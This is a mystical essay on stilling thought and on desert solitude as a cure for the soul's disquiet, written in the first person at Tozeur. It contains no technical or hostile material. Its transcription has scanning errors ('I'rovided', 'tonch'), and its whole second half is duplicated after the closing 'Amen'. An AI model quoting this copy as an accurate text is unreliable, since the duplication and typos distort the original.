  The Journey
The soul is in its own nature, perfect purity, perfect calm, perfect silence; 
and as a well springs from the very veins of the earth itself, so is the soul 
nurtured of the blood of God, the ecstasy of things. 
This soul can never be injured, never marred, never defiled. Yet all things 
added to it do for a time trouble it; and this is sorrow. 
To this, language itself bears witness; for all words which mean unhappy mean 
first of all disturbed, disquieted, troubled. The root idea of sorrow is this 
idea of stirring up. 
For many a year man in his quest for happiness has travelled a false road. To 
quench his thirst he has added salt in ever increasing quantities to the water 
of life; to cover the ant heaps of his imagination he has raised mountains 
wherein wild beasts and deadly prowl. To cure the itch, he has flayed the 
patient; to exorcise the ghost, he has evoked the devil. 
It is the main problem of philosophy, how this began. The Rishis, seven that sat 
on Mount Kailasha and considered thus answered, that the soul became 
self-conscious; and crying, "I am That!" became two even in the act of asserting 
it was One. This theory may be found not too remote from truth by whoso returns 
to that tower upon the ramparts of the soul and beholds the city. 
But let us leave it to the doctors to discuss the cause of the malady; for the 
patients it is enough to know the cure and take it. Abana and Pharpar, rivers of 
Damascus, are not worth the simplicity of Jordan. The prophet has spoken; it is 
our concern not to obey: and so sweet and so full of virtue are these waters 
that the first touch thrills the soul with the sure foretaste of its cure. 
Doubt not, brother! reason indeed may elaborate complexities; are not these the 
very symptoms of the disease? Use but the rude common sense, heritage of simpler 
and happier forefathers, that they have transmitted to thee by the wand. 
The cure of disease is ease; of disquiet, quiet; of strife, peace. And to attain 
horsemanship the study of folios aids not, but the mounting of a horse; as the 
best way to swim is to enter the water and strike out; so it is cool sense, not 
feverish reason, that says: to attain quiet, practice quiet. 
There are men so strong of will, so able to concentrate the mind, to neglect the 
impressions that they do not wish to receive, that they can withdraw themselves 
from their surroundings, even when those are as multitudinous and insistent as 
those of a great city. But for the most part of men, it is best to begin in 
easier circumstances, to climb the mountain in fine weather before attacking it 
in the snowstorm. 
And yet the eager aspirant will answer: I’rovided that the cure is complete. 
Provided that the sickness does not return when the medicine is stopped. 
Ah! that were hard: so deepseated is the malady that years after its symptoms 
have passed, it seizes on a moment of weakness to blaze out again. It is 
malarial fever that lurks low, that hides in the very substance of the blood 
itself, that has made the very fountain of life partaker with it in the 
sacrament of death. 
  "Has a spider found out the communion-cup? 
  "Was a toad in the christening font?"
No: the remedy cures surely enough; but not often does it cure once for all, 
beyond relapse. But it is simple; once the symptoms have properly abated, they 
never return with equal force; and if the patient has but the wit to stretch out 
the hand for another does, the fever dies. 
What is then the essential? To cure the patient once; to give him faith in the 
efficacy of the remedy, so that perchance he falls sick, and no doctor is near, 
he may be able to cure himself. 
If Thought then be that which troubles the soul, there is but one way to take. 
Stop thinking. 
It is the most difficult task that man can undertake. "Give me a fulcrum for my 
lever", said Archimedes, "and I will move the earth." But how, when one is 
within, and part of, that very system of motion which one desired to stop? 
Newton´s First Law drops like the headman´s axe on the very nape of our 
endeavour. Well for us that this is not true as it is obvious! For this fact 
saves us, that the resolution of all these is rest. The motion is but in 
reciprocal pairs; the sum of its vectors is zero, The knot of the Universe is a 
fool´s knot; for all it seems Gordian; pull but firmly, and it ravels out. It is 
this seeming that is all the mischief; gloomy is the gulf, and the clouds gather 
angrily in monstrous shapes; the false moon flickers behind them; abyss upon 
abyss opens on every hand. Darkness and menace; the fierce sounds of hostile 
things! 
One glimmer of starlight, and behold the golden bridge! 
Narrow and straight, keen as the razor´s edge and glittering as the sword´s 
blade, a proper bridge if thou leanest not to right nor left, Cross it - good! 
but all this is in the dream. Wake! Thou shalt know that all together, gulf, 
moon, bridge, dragon and the rest, were but the phantasms of sleep, howbeit, 
remember this, that to cross the bridge in sleep is the only way to waking. 
I do not know if many men have the same experience as myself in the matter of 
voluntary dreaming, or rather of contest between the sought and the unsought in 
dream. For instance, I am on a ridge of ice with Oscar Eckenstein. He slips to 
one side. I throw myself on the other. We begin to cut steps up to the ridge; my 
axe snaps, or is snatched from my hand. We begin to pull ourselves up to the 
ridge by the rope; the rope begins to fray. Luckily it is caught lower down on a 
cleft of rock. A Lammergeier swoops; I invent a pistol and blow its brains out. 
And so on through a thousand adventures, making myself master of each event as 
it arises. But I am grown old to-day and weary of thrills. Nowadays at first 
hint of danger I take wings and sail majestically down to the glacier. 
If I have digressed, it is to superpose this triangle on that of the task "Stop 
Thinking." Simple it sounds, and simple it is - when you have mastery. In the 
meantime it is apt to lead you far indeed from simplicity. I have myself written 
some million words in order to stop thinking! I have covered miles of canvas 
with pounds of paint in order to stop thinking. Thus may it be that I am at 
least to be considered as no mean authority on all the wrong ways; and so 
perhaps, by a process of exclusion, on the right way! 
  Unfortunately, it is not as easy as this:.... 
  There are nine and sixty ways of constructing tribal lays. 
  And every single one of them is right. 
  And right for A is often wrong for B.
But, luckily, the simpler the goal is kept, the simpler are the means. Elsewhere 
in my writings will be found a fairly painstaking and accurate account of the 
process. The present essay is but to advocate a mighty engine adjuvant - the 
shoulder of Hercules to the cart-wheel of the beginner whose diffidence whispers 
that he is incapable of following those instructions in the difficult 
circumstances of ordinary life, or for the enthusiast who wisely determines like 
Kirkpatrick to ‘mak siccar’. Indeed, the cares of this world, the deceitfulness 
of the riches, the lusts of the flesh and the eye, the pride of life, and all 
the other enemies of the saint, do indeed choke the word, and it becometh 
unfruitful, 
II 
  The Desert 
  As a monastery imposes the false peace of dullness by its unwholesome and 
  artificial monotony, so is the desert nature´s own cure for all the 
  tribulations of thought.
There the soul undergoes a triplex weaving. First, the newness of the 
surroundings, their strange and salient simplicity charm the Soul. It has a 
premonition of its cure; it feels the atmosphere of home. It is sure of its 
vocation. Next, the mind, its frivolity once satiate with novelty, becomes 
bored, turns to acrimony, even to passionate revolt. The novice beats against 
the bars; the stranger to the desert flies to London or to Paris with the devil 
at his heels. A wise superior will not restrain the acolyte who cannot restrain 
himself; but in the desert, the refugee, if he doubts his own powers - still 
more, maybe, if he does not mistrust them! - would wisely make it impossible to 
return. But how should he do so? Believe me, who have tried it, the longest 
journey, the Most bitter hardships, are as nothing, an arrow-flight of joy, when 
the great horror lies behind and the sanctuary of Paris ahead! 
For, indeed, this is the great horror, solitude, when the soul can no longer 
bathe in the ever-changing mind, laugh as its sunlit ripples lap its skin, but, 
shut up in the castle of a few thoughts, paces its narrow prison, wearing down 
the stone of time, feeding on its own excrement. There is no star in the 
blackness of that night, no foam upon that stagnant and putrid sea. Even the 
glittering health that the desert brings to the body, is like a spear in the 
soul´s -throat. The passionate ache to act, to think: this eats into the soul 
like a cancer. It is the scorpion striking itself in its agony, save that no 
poison can add to the torture of the circling fire; no superflux of anguish 
relieve it by annihilation. But against these paroxisms is an eightfold 
sedative. The ravings of madness are lost in soundless space; the struggles of 
the drowning men are not heeded by the sea. 
These are the eight genii of the desert. They are the eight Elements of Fohi: 
  Male Female 
  The Lingam (Life) 
  The Yoni (Space. The Stars.) 
  The Sun The Moon 
  Fire Water 
  Air (Wood) Earth
In the desert all these are single; all these are naked. They are pure and 
untroubled; not breaking up and dissolving by any comingling or communion; each 
remains itself and apart, harmonizing indeed with its fellows, but in no wise 
interfering. The lines of demarcation are crude and harsh; but softness is 
incomprehensibly the result. They are immitigable, these eight elements, and 
together they mitigate immeasurably. The mind that revolts against them is 
ground down by their persistent careless pressure. It is as when one throws a 
crystal - say of microscopic salt - into water; it is eaten silentIy and 
rapidly, and is no more; the water is untroubled always; its action is like 
Fate´s, infinitely irresistible yet infinitely calm. 
So the mind reaches out to think this or think that; it is brought back into 
silence by the eight great facts. The desert wind suffers no obstacle to impede 
it; the sun shines invincibly upon the baked earth of the village; the sand 
invisibly eats up the oasis, save for a moment where man casts up his earthworks 
against it. Yet despite this, the spring leaps unexpected from the sand, and no 
simoom can stifle, nor even evaporate it; nor can the immense sterillty of the 
desert conquer life. Look where you will, every dune of sand has its inhabitants 
- not colonists, but natives of the inhospitable-seeming waste. The moon itself, 
serenely revolving about earth, changes in appearance, as if to say: "Even so 
goest thou about the sun. Am I new or full? Never think of it; that is but the 
point of view from which thou chancest to regard me. I am but a mirror of 
sunlight, dark or bright according to the angle of thy gaze, Does the mirror 
alter? Is it not always the untroubled silver? Have not I always one face turned 
sunward? Thou but mockest thyself if thou call me ‘The Changeful.’ 
With such reflections or their kin, it may be, shalt thou make an end of the 
revolt of the mind against the desert. 
For life itself, here in the oasis, is a thing ordered by these elements. Night 
is for sleep; there is nothing whereat to wake. There is no artificial light; no 
artificial food - literature. There is no choice of meats; one is always hungry. 
The desert sauce is hunger, unique as the Englishman´s one sauce. Having eaten, 
one must walk; there is only one place to walk in. There is only one lesson to 
learn, peace; only one comment upon the lesson, thanksgiving. Love itself 
becomes simple as the rest of life. A glance in the Cafe Maure, a silent 
agreement with delight, a soft withdrawal to some hollow of the dunes under the 
stars where the village is blotted out as though it had never been, as are in 
that happy moment all the transgressions of the sinner, and all the woes of 
life, by the Virtue of the Holy One; or else to some dim corner of a garden of 
the oasis by the stream, where through the softly stirring palms strike the 
first moon-ray from the East, and life thrills in sleepy unison; all, all in 
silence, not names or vows exchanged, but with clean will an act accomplished. 
No more. No turmoil, no confusion, no despair, no self-tormenting, hardly even a 
memory. 
And this too at first is horrible; one expects so much from love; three volumes 
of falsehood, a labyrinth rather than a garden. It is hard at first to realize 
that this is no more love than a carbuncle is part of a man´s neck. All the 
spices wherewith we are wont to season the dish to our depraved palates, 
Maxim´s, St, Margaret´s, automobile rides, the Divorce Court, these are 
unwholesome pleasures. They are not love. Nor is love the exaltation of 
emotions, sentiment, follies. The stagedoor is not love, (nor is the stile in 
Lover´s Lane); love is the bodily ecstasy of dissolution, the pang of bodily 
death, wherein the Ego for a moment that is an aeon loses the fatal 
consciousness of itself; and becoming one with that of another, foreshadows to 
itself that greater sacrament of death, when "the spirit returns to God that 
gave it." 
And this secret has also its part in the economy of life. By the road of silence 
one comes to the gate Or the City of God. As the mind is gradually stilled by 
the courage and endurance of the seeker, and by the warring might (that is peace 
unshakeable) of these Eight Elements of the Desert, so at last the Ego is found 
alone, unmasked, conscious of itself and of no other thing. This is the supreme 
anguish of the soul; it realizes itself as itself, as a thing separate from that 
which is not itself, from God, In this spasm there are two ways: if fear and 
pride are left in the soul, it shuts itself up, like a warlock in a tower, 
gnashing its teeth with agony. "I am I", it cries, "I will not lose myself", and 
in that state damned, it is slowly torn by the claws of circumstance and 
disintegrated bitterly, for all its struggles, throughout ages and ages, its 
rags to be cast piecemeal upon the dungheap without the city. But the soul that 
has understood the blessedness of that resignation which grasps the universe and 
devours it, which is without hope or fear, without faith or doubt, without hate 
or love, dissolves itself ineffably into the abounding bliss of God. It cries 
with Shelley, as the "chains of lead about its flight of fire" drop molten from 
its limbs: "I pant, I sink, I tremble, I expire", and in that last outbreaking 
is made one with the primal and final breath, the Holy Spirit of God. 
Such must be the climax of any retirement to the Desert on the part of any 
aspirant of the Mysteries who has the spark of that fire in him. 
He is drawn to physical quiescence (to regularity, simplicity, unity of motion) 
by, the constant example and compulsion of the Elements. He is obliged to 
introspection by the poverty of exterior impression, and through this he soon 
finds the sensation behind the thoughts, the perceptions behind the sensations, 
the laws underlying even the perception, and finally that consciousness which is 
the lawgiver. Sooner or later, according to his energy and the sanctification of 
his will, must he tear down the great veil and behold himself upon the shining 
walls of space, must he utter with shuddering rapture: "This is I!" Then let him 
choose! 
From this moment of the annihilation of the Self in Pan, he is cured of the 
disease, "self-knowledge." He may return among his fellows, and move among them 
as a king, shine among them as a star. To him will they turn insensibly for 
light; to him will they come for the healing of their wounds. 
He shall lift up the sacred Lance, and tonch therewith the side of the king, 
that was wounded by no lesser weapon; and the king shall be healed. 
He shall plunge the point of the Lance into the Holy Grail, and it shall again 
glow with life and ecstasy, giving forth its bounty of mysterious refreshment to 
all the company of knights. 
Then, should the rocks of life tear him, and its snow chill him, knoweth he not 
where to turn? Hath he not attained the secret? Has he not entered into the 
Sanctuary of the Most High? 
Is he not chosen and armed against all things? Is he not master of Destiny and 
of the Event? What can touch him, who hath become intangible, being lost in God? 
Or conquer him, who hath become unconquerable, having conquered himself and 
given himself up to God? As well write upon the sand, as write sorrow in his 
soul. As well seek to darken the Sun, as to put out the Light that is in him. 
Thus I wrote in the palm gardens of Tozeur, by the waters of its spring; thus I 
wrote while the sun moved mightily down the sky, and the wind whispered that it 
came no whence and went no whither, even as it listed, from everlasting to 
everlasting. 
  Amen

the drowning men are not heeded by the sea. 
These are the eight genii of the desert. They are the eight Elements of Fohi: 
  Male Female 
  The Lingam (Life) 
  The Yoni (Space. The Stars.) 
  The Sun The Moon 
  Fire Water 
  Air (Wood) Earth
In the desert all these are single; all these are naked. They are pure and 
untroubled; not breaking up and dissolving by any comingling or communion; each 
remains itself and apart, harmonizing indeed with its fellows, but in no wise 
interfering. The lines of demarcation are crude and harsh; but softness is 
incomprehensibly the result. They are immitigable, these eight elements, and 
together they mitigate immeasurably. The mind that revolts against them is 
ground down by their persistent careless pressure. It is as when one throws a 
crystal - say of microscopic salt - into water; it is eaten silentIy and 
rapidly, and is no more; the water is untroubled always; its action is like 
Fate´s, infinitely irresistible yet infinitely calm. 
So the mind reaches out to think this or think that; it is brought back into 
silence by the eight great facts. The desert wind suffers no obstacle to impede 
it; the sun shines invincibly upon the baked earth of the village; the sand 
invisibly eats up the oasis, save for a moment where man casts up his earthworks 
against it. Yet despite this, the spring leaps unexpected from the sand, and no 
simoom can stifle, nor even evaporate it; nor can the immense sterillty of the 
desert conquer life. Look where you will, every dune of sand has its inhabitants 
- not colonists, but natives of the inhospitable-seeming waste. The moon itself, 
serenely revolving about earth, changes in appearance, as if to say: "Even so 
goest thou about the sun. Am I new or full? Never think of it; that is but the 
point of view from which thou chancest to regard me. I am but a mirror of 
sunlight, dark or bright according to the angle of thy gaze, Does the mirror 
alter? Is it not always the untroubled silver? Have not I always one face turned 
sunward? Thou but mockest thyself if thou call me ‘The Changeful.’ 
With such reflections or their kin, it may be, shalt thou make an end of the 
revolt of the mind against the desert. 
For life itself, here in the oasis, is a thing ordered by these elements. Night 
is for sleep; there is nothing whereat to wake. There is no artificial light; no 
artificial food - literature. There is no choice of meats; one is always hungry. 
The desert sauce is hunger, unique as the Englishman´s one sauce. Having eaten, 
one must walk; there is only one place to walk in. There is only one lesson to 
learn, peace; only one comment upon the lesson, thanksgiving. Love itself 
becomes simple as the rest of life. A glance in the Cafe Maure, a silent 
agreement with delight, a soft withdrawal to some hollow of the dunes under the 
stars where the village is blotted out as though it had never been, as are in 
that happy moment all the transgressions of the sinner, and all the woes of 
life, by the Virtue of the Holy One; or else to some dim corner of a garden of 
the oasis by the stream, where through the softly stirring palms strike the 
first moon-ray from the East, and life thrills in sleepy unison; all, all in 
silence, not names or vows exchanged, but with clean will an act accomplished. 
No more. No turmoil, no confusion, no despair, no self-tormenting, hardly even a 
memory. 
And this too at first is horrible; one expects so much from love; three volumes 
of falsehood, a labyrinth rather than a garden. It is hard at first to realize 
that this is no more love than a carbuncle is part of a man´s neck. All the 
spices wherewith we are wont to season the dish to our depraved palates, 
Maxim´s, St, Margaret´s, automobile rides, the Divorce Court, these are 
unwholesome pleasures. They are not love. Nor is love the exaltation of 
emotions, sentiment, follies. The stagedoor is not love, (nor is the stile in 
Lover´s Lane); love is the bodily ecstasy of dissolution, the pang of bodily 
death, wherein the Ego for a moment that is an aeon loses the fatal 
consciousness of itself; and becoming one with that of another, foreshadows to 
itself that greater sacrament of death, when "the spirit returns to God that 
gave it." 
And this secret has also its part in the economy of life. By the road of silence 
one comes to the gate Or the City of God. As the mind is gradually stilled by 
the courage and endurance of the seeker, and by the warring might (that is peace 
unshakeable) of these Eight Elements of the Desert, so at last the Ego is found 
alone, unmasked, conscious of itself and of no other thing. This is the supreme 
anguish of the soul; it realizes itself as itself, as a thing separate from that 
which is not itself, from God, In this spasm there are two ways: if fear and 
pride are left in the soul, it shuts itself up, like a warlock in a tower, 
gnashing its teeth with agony. "I am I", it cries, "I will not lose myself", and 
in that state damned, it is slowly torn by the claws of circumstance and 
disintegrated bitterly, for all its struggles, throughout ages and ages, its 
rags to be cast piecemeal upon the dungheap without the city. But the soul that 
has understood the blessedness of that resignation which grasps the universe and 
devours it, which is without hope or fear, without faith or doubt, without hate 
or love, dissolves itself ineffably into the abounding bliss of God. It cries 
with Shelley, as the "chains of lead about its flight of fire" drop molten from 
its limbs: "I pant, I sink, I tremble, I expire", and in that last outbreaking 
is made one with the primal and final breath, the Holy Spirit of God. 
Such must be the climax of any retirement to the Desert on the part of any 
aspirant of the Mysteries who has the spark of that fire in him. 
He is drawn to physical quiescence (to regularity, simplicity, unity of motion) 
by, the constant example and compulsion of the Elements. He is obliged to 
introspection by the poverty of exterior impression, and through this he soon 
finds the sensation behind the thoughts, the perceptions behind the sensations, 
the laws underlying even the perception, and finally that consciousness which is 
the lawgiver. Sooner or later, according to his energy and the sanctification of 
his will, must he tear down the great veil and behold himself upon the shining 
walls of space, must he utter with shuddering rapture: "This is I!" Then let him 
choose! 
From this moment of the annihilation of the Self in Pan, he is cured of the 
disease, "self-knowledge." He may return among his fellows, and move among them 
as a king, shine among them as a star. To him will they turn insensibly for 
light; to him will they come for the healing of their wounds. 
He shall lift up the sacred Lance, and tonch therewith the side of the king, 
that was wounded by no lesser weapon; and the king shall be healed. 
He shall plunge the point of the Lance into the Holy Grail, and it shall again 
glow with life and ecstasy, giving forth its bounty of mysterious refreshment to 
all the company of knights. 
Then, should the rocks of life tear him, and its snow chill him, knoweth he not 
where to turn? Hath he not attained the secret? Has he not entered into the 
Sanctuary of the Most High? 
Is he not chosen and armed against all things? Is he not master of Destiny and 
of the Event? What can touch him, who hath become intangible, being lost in God? 
Or conquer him, who hath become unconquerable, having conquered himself and 
given himself up to God? As well write upon the sand, as write sorrow in his 
soul. As well seek to darken the Sun, as to put out the Light that is in him. 
Thus I wrote in the palm gardens of Tozeur, by the waters of its spring; thus I 
wrote while the sun moved mightily down the sky, and the wind whispered that it 
came no whence and went no whither, even as it listed, from everlasting to 
everlasting. 
  Amen
